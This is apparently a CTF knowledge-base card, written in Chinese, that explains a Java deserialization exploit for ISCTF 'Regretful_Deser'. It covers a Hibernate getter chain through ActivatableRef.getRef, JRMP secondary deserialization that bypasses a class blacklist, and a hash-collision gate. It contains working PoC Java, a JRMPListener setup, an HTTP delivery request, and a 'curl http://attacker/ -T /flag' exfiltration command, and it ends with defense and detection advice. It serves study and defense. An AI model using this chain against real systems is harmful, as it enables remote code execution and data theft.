---
id: web-java-deser-hibernate-activatableref-jrmp-secondary-bypass
title: Hibernate getter + ActivatableRef.getRef 触发 JRMP 二次反序列化绕过类名黑名单
type: scenario
domain: web
path: web/java/deserialization
technique: hibernate-activatableref-jrmp-secondary-deser
aliases:
- Regretful_Deser
- Hibernate 5.6.15 反序列化
- ActivatableRef.getRef
- JRMP 二次反序列化
- StreamRemoteCall.executeCall
- RemoteObjectInvocationHandler 动态代理
- 绕过 SecurityObjectInputStream 黑名单
tags:
- java
- deserialization
- hibernate
- jrmp
- rmi
- secondary-deserialization
- blacklist-bypass
- gadget-chain
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V173
  verified_at: '2026-11-06T17:51:44+08:00'
  notes: 已对照原文与21图核对：SecurityObjectInputStream黑名单、Hibernate 5.6.15 getter链、GetterMethodImpl.get→ActivatableRef.getRef→activate→ActivationID.activate→动态代理UnicastRef→StreamRemoteCall.executeCall的in.readObject二次反序列化均与图/调用栈一致；已将“只重写resolveClass”改为“常见实现为重写resolveClass”的审慎表述。原文称JRMP+java-chains外带成功但无flag截图，卡内confidence=medium已注明。第二题JDK11/Jackson链跳过成立，两张关联卡均已确认存在
---

## 一句话结论

当 `ObjectInputStream` 子类只在 `resolveClass` 里按类名黑名单拦截、且 classpath 有 Hibernate 5.6.15 时，可以用 `TypedValue/ComponentType/PojoComponentTuplizer` 的 getter 链调用 `sun.rmi.server.ActivatableRef.getRef()`；`getRef()` 内部 `activate(false)` 会调用 `ActivationID.activate`，若其 `Activator` 是绑定了 `UnicastRef` 的动态代理，就会走 `RemoteObjectInvocationHandler.invoke → UnicastRef.invoke → StreamRemoteCall.executeCall`，最终对 JRMP 服务端返回的异常执行 `in.readObject()`，用 JDK 自己的流完成第二次反序列化，绕过外层黑名单执行 CC/TemplatesImpl 链。

## 原理

- **外层入口**：应用把请求头 `echo` 的 Base64 交给 `SecurityObjectInputStream.readObject()`；该流按类名黑名单拦截（常见实现为重写 `resolveClass`），黑名单包含 `org.apache.commons.collections`、`javax.swing`、`com.sun.rowset`、`com.sun.org.apache.xalan`、`java.security`、`java.rmi.MarshalledObject`、`javax.management.remote.rmi.RMIConnector` 等。直接放 CC/TemplatesImpl 会被类名拦截。
- **Hibernate getter 链**：Hibernate 5.6.15 提供 `TypedValue.hashCode → ValueHolder.getValue → ComponentType.getHashCode → ComponentType.getPropertyValue → AbstractComponentTuplizer.getPropertyValue → GetterMethodImpl.get` 的调用路径。`GetterMethodImpl` 保存一个 `Method`，`get(owner)` 执行 `getterMethod.invoke(owner)`；攻击者把 method 设为 `ActivatableRef.getRef()`（无参），owner 为 `ActivatableRef` 实例，即可在 `hashCode` 触发时调用无参 `getRef`。
- **ActivatableRef.getRef → activate**：`getRef()` 在 `ref == null` 时调用 `activate(false)`；`activate` 执行 `Remote proxy = id.activate(force)`，其中 `id` 是 `ActivationID`。`ActivationID.activate` 调用其 `activator.activate(this, force)`；若 `activator` 是实现了 `java.rmi.Remote` 和 `java.rmi.activation.Activator` 的动态代理，代理 handler 为 `RemoteObjectInvocationHandler`（内含指向攻击者 JRMP 端点的 `UnicastRef`），调用 `activate` 就会走 `RemoteObjectInvocationHandler.invokeRemoteMethod → UnicastRef.invoke → StreamRemoteCall.executeCall`。
- **JRMP 二次反序列化**：`StreamRemoteCall.executeCall` 在 `TransportConstants.ExceptionalReturn` 分支执行 `ex = in.readObject()`；`in` 是 JDK 内部创建的 `ObjectInputStream`，不经过外层 `SecurityObjectInputStream.resolveClass`。攻击者的 JRMP 服务端返回一个序列化对象（异常包装或正常返回值），该对象在目标端被反序列化，触发内层 CC1/CC3/TemplatesImpl 链。
- **为什么绕过**：黑名单只约束“外层流的类名”；`ActivatableRef`、`ActivationID`、Hibernate 类都不在黑名单里，内层 payload 只存在于 JRMP 响应字节流中，类名检查完全没机会看到。
- **外层对象图**：`Hashtable` 的 key 设为 `TypedValue(componentType, activatableRef)`；`ComponentType.propertySpan=2`；`PojoComponentTuplizer.getters = [GetterMethodImpl(Object.class, "qwq", ActivatableRef.getRef)]`；`ComponentType.componentTuplizer=pojoComponentTuplizer`。`Hashtable` 反序列化时重算 key 的 hashCode，触发整条链。
- **入口门禁**：本题 HTTP 入口还要求 `Pass` 与固定串 `n1ght` 的 `hashCode` 相等但不相等；Java String 的 31 进制哈希可构造碰撞（如 `n1giU`），这只是进入反序列化的 gate，与主链独立。

## 触发条件

- 目标为 JDK 8（本题 8u472），classpath 有 Hibernate 5.6.15（或含 `TypedValue/ComponentType/GetterMethodImpl` 的版本）与 commons-collections（供内层 CC 链）。
- 应用使用 `ObjectInputStream` 子类做类名黑名单，但未使用 JEP 290 全局 `jdk.serialFilter`/`ObjectInputFilter`。
- 目标可出站连接攻击者 JRMP 端口（本题通过 java-chains JRMPListener），或攻击者能把 JRMP 服务端放到目标可达位置。
- 黑名单未包含 `sun.rmi.server.ActivatableRef`、`java.rmi.activation.ActivationID`、Hibernate 类。
- 内层 payload 的类名（CC/TemplatesImpl）只在 JRMP 响应中出现，外层流不出现。

## 利用步骤

1. **确认依赖与黑名单**：从 jar/pom 确认 Hibernate 5.6.15、commons-collections；反编译 `SecurityObjectInputStream`，确认只重写 `resolveClass` 且黑名单名单。
2. **准备 JRMP 服务端**：用 java-chains 启动 JRMPListener，选择 CC1/CC3 + TemplatesImpl + Exec，命令如 `curl http://attacker/ -T /flag` 或反弹 shell；记录 host/port。
3. **构造 ActivatableRef**：`ObjID`、`TCPEndpoint(host, port)`、`UnicastRef`、`RemoteObjectInvocationHandler`、动态代理（接口 `Remote`+`Activator`）、`ActivationID(proxy)`；用反射/`ReflectionFactory` 创建 `ActivatableRef` 并设置 `id`。
4. **构造 Hibernate 链**：反射创建 `ComponentType`、`PojoComponentTuplizer`，设置 `propertySpan`、`getters`（`GetterMethodImpl` 指向 `ActivatableRef.getRef`）、`componentTuplizer`；`TypedValue(componentType, activatableRef)`。
5. **放入 Hashtable**：`Hashtable.put(1,111)` 后反射把 table entry 的 key 替换为 `TypedValue`，使反序列化时触发 hashCode。
6. **序列化并投递**：Base64 编码后放入 `echo` 请求头；`Pass` 用 `n1ght` 的哈希碰撞串（如 `n1giU`）过 gate。
7. **触发与验证**：目标反序列化 → Hibernate getter → `getRef` → JRMP 连接 → `StreamRemoteCall.readObject` → 内层 CC 链执行；在 JRMP 服务端/外带通道确认命令结果。

## PoC

外层对象图核心（按原文简化）：

```java
Hashtable ht = new Hashtable();

ComponentType componentType = createObjWithoutConstructor(ComponentType.class);
setField(componentType, "propertySpan", 2);

ObjID id2 = new ObjID(new Random().nextInt());
TCPEndpoint te = new TCPEndpoint(attackerHost, attackerPort);
UnicastRef ref = new UnicastRef(new LiveRef(id2, te, false));
RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);
Object proxy = Proxy.newProxyInstance(
    ClassLoader.getSystemClassLoader(),
    new Class[]{Remote.class, Activator.class}, handler);
ActivationID activationID = new ActivationID((Activator) proxy);

Class<?> ar = Class.forName("sun.rmi.server.ActivatableRef");
ActivatableRef activatableRef = (ActivatableRef) createObjWithoutConstructor(ar);
setField(activatableRef, "id", activationID);

PojoComponentTuplizer tuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);
Field getters = AbstractComponentTuplizer.class.getDeclaredField("getters");
getters.setAccessible(true);
getters.set(tuplizer, new Getter[]{
    new GetterMethodImpl(Object.class, "qwq", ar.getDeclaredMethod("getRef"))
});
setField(componentType, "componentTuplizer", tuplizer);

TypedValue typedValue = new TypedValue(componentType, activatableRef);
ht.put(1, 111);
Field tableField = Hashtable.class.getDeclaredField("table");
tableField.setAccessible(true);
for (Object entry : (Object[]) tableField.get(ht)) {
    if (entry != null) setField(entry, "key", typedValue);
}
String b64 = Base64.getEncoder().encodeToString(ser(ht));
```

JRMP 服务端用 java-chains：

```bash
java -jar java-chains.jar -i 0.0.0.0
# JRMPListener 选择 CommonsCollections1/3 + TemplatesImpl + Exec
# 命令示例：curl http://attacker/ -T /flag
```

HTTP 投递：

```http
GET /api/echo HTTP/1.1
Host: target:20811
Pass: n1giU
echo: <base64(serialize(hashtable))>
```

原文通过 java-chains 的 JRMPListener + Exec 外带 `/flag`；未给出本机的 flag 截图，故 confidence=medium。`Pass` 碰撞串 `n1giU` 是原文脚本输出之一（`n1ght` 的其他碰撞也可）。

## 变体与关联

- 变体：Hibernate 版本不同时 getter 链入口可能变化；`GetterMethodImpl` 可指向其他无参 getter；JRMP 内层可用 CC1/CC3/CC4/Jackson；若目标不出网，可改用 `RMIConnector`/`JdbcRowSetImpl` 等本地二次反序列化点（见关联卡）。
- 关联：[[web-java-deser-readobject-reflection-rmiconnector-secondary]]（`YouFindThis` 反射 + `RMIConnector.connect(Map)` 的本地二次反序列化，适合不出网场景）、[[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]（内层 POJONode/EventListenerList 链）、[[web-java-deser-commonscollections-cc1-transformedmap]]、[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（内层 CC 链）、[[web-java-deserialization-hashmap-business-field-local-file-read]]（Hashtable/HashMap 触发 hashCode 的类似入口）。
- 同题：ISCTF `Regretful_Deser`，JDK 8u472 + Hibernate 5.6.15 + commons-collections 3.2.1；入口 `/api/echo` 的 `Pass` 哈希碰撞 + `echo` 反序列化。

## 检测与防御

- **不要用类名黑名单**：改用 JEP 290 全局 `jdk.serialFilter`/`ObjectInputFilter`，并在所有 `new ObjectInputStream`（包括第三方库内部）上合并过滤器；黑名单无法覆盖 JDK 内部流。
- **禁止危险 JDK 类**：在过滤器层面拒绝 `sun.rmi.*`、`java.rmi.activation.*`、`com.sun.org.apache.xalan.*`、`org.apache.commons.collections.*` 等；升级 JDK 并启用 `jdk.serialFilter` 默认拒绝策略。
- **网络层**：限制应用出站到任意 JRMP/RMI 端口，只允许白名单；监控 `UnicastRef`/`StreamRemoteCall` 相关连接与异常流量。
- **依赖治理**：移除不必要的 Hibernate/commons-collections 反序列化入口；对 `ObjectInputStream` 的使用做代码审计。
- **检测**：监控反序列化请求中出现 `ActivatableRef`、`ActivationID`、`UnicastRef`、`TypedValue`、`ComponentType` 等类名（即使在 Base64 中也可通过解码/IDS 检测）；对 `/api/echo` 这类接受序列化 header 的接口做重点防护。
